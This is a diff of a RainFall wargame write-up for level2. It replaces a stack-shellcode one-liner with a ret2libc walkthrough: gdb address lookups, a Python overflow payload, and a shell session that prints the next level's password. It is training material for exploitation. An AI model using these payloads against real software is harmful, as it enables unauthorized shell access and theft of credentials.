@@ -1,24 +1,89 @@
-Step 1: Analyze binary with GDB
-$ gdb ./level2
-(gdb) info functions        # Found gets(), strdup()
-(gdb) disassemble p         # Found stack protection check
+# Level 2 - ret2libc (Bypass Stack Protection)
 
-Step 2: Understand protection
-- Blocks return addresses where (addr & 0xb0000000) == 0xb0000000
-- Stack addresses (0xbffffxxx) are blocked
-- Heap addresses (0x804axxxx) bypass protection
+## Challenge
+Stack addresses starting with 0xb are rejected. We cannot use shellcode on the stack.
 
-Step 3: Find heap address
-$ gdb ./level2
-(gdb) break *0x804853d     # After strdup call
+## Solution: ret2libc
+Instead of shellcode, we'll use existing libc functions:
+1. Call `system()` from libc
+2. Pass "/bin/sh" string as argument
+
+## Finding Addresses
+
+### 1. Find system() Address
+```bash
+(gdb) break p
 (gdb) run
-(gdb) info registers eax   # Heap address = 0x804a008
+(gdb) print system
+$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
 
-Step 4: Create exploit
-$ (python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80" + "A"*57 + "\x08\xa0\x04\x08"'; cat) | ./level2
+(gdb) print __libc_system
+$2 = {<text variable, no debug info>} 0xb7e6b060
+```
 
-Step 5: Got shell and retrieved password
+### 2. Find "/bin/sh" String
+```bash
+(gdb) find &system,+9999999,"/bin/sh"
+0xb7f8cc58
+
+(gdb) x/s 0xb7f8cc58
+0xb7f8cc58:      "/bin/sh"
+```
+
+### 3. Calculate Buffer Offset
+```bash
+(gdb) pattern create 100
+(gdb) run
+(gdb) pattern offset $eip
+[*] Exact match at offset 80
+```
+
+## Exploitation
+
+### Stack Layout After Overflow
++------------------+
+| "/bin/sh" addr   | <- Argument to system()
++------------------+
+| FAKE RET (BBBB)  | <- Fake return addr (doesn't matter)
++------------------+
+| system() addr    | <- Return address (calls system)
++------------------+
+| Saved EBP (AAAA) | <- 4 bytes
++------------------+
+| Buffer (76 bytes)| <- Overflow starts here
++------------------+
+
+
+### Crafting Payload
+```python
+#!/usr/bin/env python
+
+# Addresses (adjust to your system)
+system_addr = "\x60\xb0\xe6\xb7"  # 0xb7e6b060
+binsh_addr = "\x58\xcc\xf8\xb7"    # 0xb7f8cc58
+fake_ret = "BBBB"
+
+# Build payload
+buffer = "A" * 76
+ebp = "AAAA"
+
+payload = buffer + ebp + system_addr + fake_ret + binsh_addr
+
+print payload
+```
+
+### Execution
+```bash
+level2@RainFall:~$ (python exploit.py; cat) | ./level2
+AAAAAAAA...
 whoami
 level3
 cat /home/user/level3/.pass
 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+```
+
+## Key Concepts
+- ret2libc technique
+- Bypassing non-executable stack (NX)
+- Function call convention
+- Argument passing on stack
